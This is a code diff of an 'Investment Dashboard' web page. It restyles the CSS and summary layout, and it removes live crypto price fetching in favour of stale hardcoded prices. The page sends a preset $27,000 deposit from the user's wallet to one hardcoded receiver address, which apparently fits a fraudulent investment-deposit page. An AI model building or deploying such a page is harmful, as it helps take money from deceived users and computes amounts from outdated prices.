@@ -17,17 +17,106 @@
     --text-main:#e0e0e0;
     --text-dim:#94a3b8;
 }
-*{box-sizing:border-box;margin:0;padding:0;font-family:'Inter',sans-serif;}
-body{background:var(--bg-dark);color:var(--text-main);}
-.container{max-width:480px;margin:40px auto;background:var(--card-bg);border-radius:16px;padding:24px;}
-h2{text-align:center;margin-bottom:24px;color:var(--primary);}
-.input-group{margin-bottom:18px;}
-label{display:block;font-size:13px;color:var(--text-dim);margin-bottom:6px;}
-input,select{width:100%;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg-dark);color:white;}
-button{width:100%;padding:14px;margin-top:10px;border:none;border-radius:10px;font-weight:600;cursor:pointer;}
-.btn{background:linear-gradient(135deg,var(--primary),var(--secondary));color:white;}
-.summary{background:#1e293b;padding:16px;border-radius:10px;margin:16px 0;}
-.status{text-align:center;margin-top:10px;color:var(--primary);}
+
+*{
+    box-sizing:border-box;
+    margin:0;
+    padding:0;
+    font-family:'Inter',sans-serif;
+}
+
+body{
+    background:var(--bg-dark);
+    color:var(--text-main);
+}
+
+.container{
+    max-width:480px;
+    margin:40px auto;
+    background:var(--card-bg);
+    border-radius:16px;
+    padding:24px;
+}
+
+h2{
+    text-align:center;
+    margin-bottom:24px;
+    color:var(--primary);
+}
+
+.input-group{
+    margin-bottom:18px;
+}
+
+label{
+    display:block;
+    font-size:13px;
+    color:var(--text-dim);
+    margin-bottom:6px;
+}
+
+input,select{
+    width:100%;
+    padding:10px;
+    border-radius:8px;
+    border:1px solid var(--border);
+    background:var(--bg-dark);
+    color:white;
+}
+
+button{
+    width:100%;
+    padding:14px;
+    margin-top:10px;
+    border:none;
+    border-radius:10px;
+    font-weight:600;
+    cursor:pointer;
+}
+
+.btn{
+    background:linear-gradient(135deg,var(--primary),var(--secondary));
+    color:white;
+}
+
+/* 🔥 IMPROVED SUMMARY */
+.summary{
+    background:#1e293b;
+    padding:16px;
+    border-radius:10px;
+    margin:16px 0;
+    display:flex;
+    flex-direction:column;
+    gap:10px;
+}
+
+.summary-row{
+    display:flex;
+    justify-content:space-between;
+    align-items:flex-start;
+    flex-wrap:wrap;
+    gap:6px;
+}
+
+.summary-label{
+    color:var(--text-dim);
+    font-size:13px;
+    min-width:90px;
+}
+
+.summary-value{
+    color:var(--text-main);
+    font-weight:600;
+    text-align:right;
+    max-width:70%;
+    word-break:break-word;
+}
+
+.status{
+    text-align:center;
+    margin-top:10px;
+    color:var(--primary);
+}
 
 .wallet-info{
     background:#0f172a;
@@ -35,14 +124,23 @@ button{width:100%;padding:14px;margin-top:10px;border:none;border-radius:10px;fo
     border-radius:12px;
     margin-top:12px;
 }
-.wallet-label{font-size:12px;color:var(--text-dim);}
-.wallet-value{font-weight:600;margin-bottom:6px;}
+
+.wallet-label{
+    font-size:12px;
+    color:var(--text-dim);
+}
+
+.wallet-value{
+    font-weight:600;
+    margin-bottom:6px;
+}
 </style>
 </head>
 
 <body>
 
 <div class="container">
+
 <h2>Investment Dashboard</h2>
 
 <div class="input-group">
@@ -60,10 +158,22 @@ button{width:100%;padding:14px;margin-top:10px;border:none;border-radius:10px;fo
 <input type="number" id="amount" readonly>
 </div>
 
+<!-- 🔥 NEW CLEAN SUMMARY -->
 <div class="summary">
-<p>Token: <span id="summaryToken">ETH</span></p>
-<p>USD: <span id="summaryAmount">27000</span></p>
-<p>Coins: <span id="coinEquivalent">-</span></p>
+    <div class="summary-row">
+        <div class="summary-label">Token</div>
+        <div class="summary-value" id="summaryToken">ETH</div>
+    </div>
+
+    <div class="summary-row">
+        <div class="summary-label">USD</div>
+        <div class="summary-value" id="summaryAmount">27000</div>
+    </div>
+
+    <div class="summary-row">
+        <div class="summary-label">Coins</div>
+        <div class="summary-value" id="coinEquivalent">-</div>
+    </div>
 </div>
 
 <button class="btn" onclick="connectWallet()">Connect Wallet</button>
@@ -89,7 +199,6 @@ let provider, signer;
 let selectedToken = "ETH";
 let investUSD = 27000;
 
-// 🔥 LIVE PRICES (worden overschreven door CoinGecko)
 let PRICES = {
     ETH: 1800,
     USDC: 1,
@@ -102,32 +211,6 @@ const TOKENS = {
 };
 
 const RECEIVER = "0x7e60e8c68965EFD8C969Fae1e0f640f890109908";
-
-function formatCrypto(amount, symbol){
-    if(symbol === "WBTC") return amount.toFixed(6);
-    if(symbol === "ETH") return amount.toFixed(5);
-    if(symbol === "USDC") return amount.toFixed(2);
-    return amount.toFixed(6);
-}
-
-// 🔥 COINGECKO LIVE PRICES
-async function fetchPrices(){
-    try{
-        const res = await fetch(
-            "https://api.coingecko.com/api/v3/simple/price?ids=ethereum,wrapped-bitcoin,tether&vs_currencies=usd"
-        );
-
-        const data = await res.json();
-
-        PRICES.ETH = data.ethereum.usd;
-        PRICES.WBTC = data["wrapped-bitcoin"].usd;
-        PRICES.USDC = data.tether.usd;
-
-        updateCoin();
-    }catch(e){
-        console.log("Price fetch failed", e);
-    }
-}
 
 function updateToken(){
     selectedToken=document.getElementById("tokenSelect").value;
@@ -143,9 +226,10 @@ function updateAmount(v){
 }
 
 function updateCoin(){
-    const coin=(investUSD / PRICES[selectedToken]);
+    const coin = investUSD / PRICES[selectedToken];
+
     document.getElementById("coinEquivalent").innerText =
-        formatCrypto(coin, selectedToken) + " " + selectedToken;
+        coin.toFixed(6) + " " + selectedToken;
 }
 
 // CONNECT
@@ -186,7 +270,7 @@ async function disconnectWallet(){
     document.getElementById("status").innerText = "Disconnected";
 }
 
-// SEND TX
+// SEND
 async function sendDeposit(){
     if(!signer) return;
 
@@ -208,6 +292,7 @@ async function sendDeposit(){
             const token = TOKENS[selectedToken];
 
             const raw = investUSD / PRICES[selectedToken];
+
             const parsed = ethers.utils.parseUnits(
                 raw.toFixed(token.decimals),
                 token.decimals
@@ -222,26 +307,19 @@ async function sendDeposit(){
             tx = await contract.transfer(RECEIVER, parsed);
         }
 
-        document.getElementById("status").innerText="Waiting confirmation...";
         await tx.wait();
-
         document.getElementById("status").innerText="Success ✅";
 
     }catch(e){
         console.error(e);
 
-        if(e.code === 4001){
-            document.getElementById("status").innerText="User rejected ❌";
-        } else {
-            document.getElementById("status").innerText="Error ⚠️";
-        }
+        document.getElementById("status").innerText =
+            e.code === 4001 ? "User rejected ❌" : "Error ⚠️";
     }
 }
 
 // INIT
 updateAmount(27000);
-fetchPrices();
-setInterval(fetchPrices, 30000);
 </script>
 
 </body>
